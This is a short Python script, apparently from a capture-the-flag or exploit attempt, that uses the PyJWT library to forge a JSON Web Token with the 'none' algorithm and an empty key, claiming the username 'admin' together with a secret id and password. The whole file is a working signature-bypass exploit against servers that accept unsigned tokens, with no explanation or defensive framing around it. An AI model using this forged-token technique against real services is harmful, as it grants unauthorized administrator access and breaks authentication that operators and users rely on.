import jwt

token = jwt.encode({"secretid": 0.1, "username": "admin", "password": "aa", "iat": 1652681684}, algorithm="none",
                   key="").decode(encoding='utf-8')
print(token)
